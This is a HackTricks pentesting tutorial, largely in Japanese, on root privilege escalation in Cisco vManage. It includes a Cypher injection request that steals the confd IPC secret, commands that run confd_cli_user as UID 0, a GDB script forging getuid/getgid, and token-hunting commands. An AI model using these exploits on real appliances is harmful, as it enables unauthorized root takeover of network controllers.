# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* 上で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を得たら、最も興味深い local privesc の対象は通常、`confd` CLI stack、`cmdptywrapper` ヘルパー、localhost REST APIs、および root-owned の import/upload handlers です。

controller 上でまだ **initial foothold** が必要な場合は、まず専用の control-plane ページを確認してください:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
`/etc/confd/confd_ipc_secret` が foothold から読み取り可能であれば、Path 1 と Path 2 はすぐに実用的になります。

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` と各種バイナリに関するいくつかの [documentation](http://66.218.245.39/doc/html/rn03re18.html)（Cisco の website の account でアクセス可能）を少し調べたところ、IPC socket を認証するために、`/etc/confd/confd_ipc_secret` にある secret を使用していることがわかりました:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j インスタンスのことを覚えていますか？それは `vmanage` ユーザーの権限で実行されているため、前の脆弱性を使ってファイルを取得できます:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。なので、`/usr/bin/confd_cli_user` を自分の任意の引数セットで直接呼び出せます。ただし、現在の権限では読み取りできないため、rootfs から取得して `scp` でコピーし、help を読んで、それを使って shell を取得する必要があります:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktivチームのblog¹ではroot shellを取得する洗練された方法が説明されていたが、注意点として、rootのみが読み取り可能な `/usr/bin/confd_cli_user` のコピーを入手する必要がある。私は、そのような手間なしにrootへ権限昇格する別の方法を見つけた。

`/usr/bin/confd_cli` binary を逆アセンブルしたところ、以下を確認した:

<details>
<summary>UID/GID collection を示すObjdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

「ps aux」を実行したところ、以下を確認しました（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、「confd_cli」プログラムが、ログイン中のユーザーから収集した user ID と group ID を「cmdptywrapper」アプリケーションに渡していると仮定しました。

最初の試みとして、「cmdptywrapper」を直接実行し、`-g 0 -u 0` を指定してみましたが、失敗しました。途中のどこかで file descriptor（-i 1015）が作成されており、偽装できないようです。

synacktiv の blog（最後の例）で述べられているように、「confd_cli」プログラムは command line argument をサポートしていませんが、debugger で影響を与えることができ、幸いにもシステムには GDB が含まれています。

私は、API `getuid` と `getgid` が 0 を返すように強制する GDB script を作成しました。すでに deserialization RCE によって “vmanage” privilege を持っているので、`/etc/confd/confd_ipc_secret` を直接読む権限があります。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、自社の advisory で [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) のよりクリーンな local root path を文書化した: **read-only 権限しか持たない認証済み attacker** が、manager CLI に crafted request を送信し、不十分な input validation のため root に到達できた。

offensive の観点から見ると、重要な takeaway は次のとおり:

1. box 上で *any* low-priv foothold を得たら、重い Path 1 / Path 2 の workflow に進む前に local CLI service をテストすべき。
2. Path 2 の artifacts を再利用して trust boundary を見つける: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend に渡されるすべての field を suspicious とみなす: UID/GID、username、terminal metadata、imported files、または後で root-owned helper によって消費される any value。
4. low-priv user が local CLI socket に到達でき、これらの field に influence できるなら、root は crafted request 1 回先にあるだけかもしれない。

appliance に landing した後の practical workflow は次のとおり:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは2025年のバグを、類似バージョンに対する有効なハンティングパターンに変えます: **userland で identity を収集し、それをより権限の高い wrapper に渡す local CLI shim** を探してください。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory also introduced another useful privesc class: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) allowed an **authenticated, local attacker with low privileges** to gain root because of an insufficient user-authentication mechanism in the REST API.

これは重要です。なぜなら、vManage の privesc はもはや `confd`/TTY abuse だけに限定されないからです。low-priv shell を得た後は、次も探してください:

- 呼び出し元を信頼しすぎる localhost-only の API エンドポイント
- 現在のアカウントから読み取れる tokens, cookies, または service credentials
- `dataservice`/REST handlers 経由で公開されている root-only アクションで、ローカルからならなおトリガーできるもの

実際には、`vmanage` や別の service user として shell を得た後は、local API abuse のほうが interactive CLI abuse よりも静かで、自動化もしやすいことがよくあります:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションのコンテキストだけで特権的なREST機能に到達できるなら、APIパスを優先してください。盗んだwebセッションやAPIトークンと組み合わせて再利用、スクリプト化、連鎖させやすいからです。

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

最近の別パターンとしては [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) があります。`netadmin` 権限を持つローカル攻撃者が **crafted file** をアップロードし、CLI が後でそれを安全でない方法で処理してしまい、`root` としてのコマンドインジェクションにつながる、というものです。

HackTricks の観点では、この手法の価値は特定のCVEよりも広いです。

1. file を受け付けるすべてのCLIまたはwebワークフローを列挙する: imports, diagnostic bundles, templates, validators, backups, tenant data, など。
2. アップロードされた file がどこに置かれ、どの root-owned script または binary がそれを消費するのかを追跡する。
3. filename, file content, 解析済み metadata のいずれかが shell commands, wrapper scripts, または `system()` 風の helper に渡されるかをテストする。
4. すでに `netadmin` に到達できるなら（有効な creds, 盗んだ session, または auth-bypass chain）、file-processing bugs はしばしば root への最短経路です。

この bug class は、`netadmin` は得られても `root` は得られない remote footholds と特に相性が良いです。

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – web UI で admin session を盗み、その後 API/CLI actions に pivot して、最終的に `vshell` か上記の local privesc paths のいずれかに到達する。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 2026 crafted-file privesc で必要とされるレベルがまさに `netadmin` なので、Path 5 の前段として非常に強力です。
- **Authenticated arbitrary file write (CVE-2026-20262)** – 後で privileged components によって解析される file を配置したり、root-owned helpers が消費する operational artifacts を上書きしたりするのに有用です。
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 専用の SD-WAN control-plane ページでより詳しく説明されています。`vmanage-admin` 用の SSH key を追加できるため、このページに戻るために必要な local foothold を得られます。

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
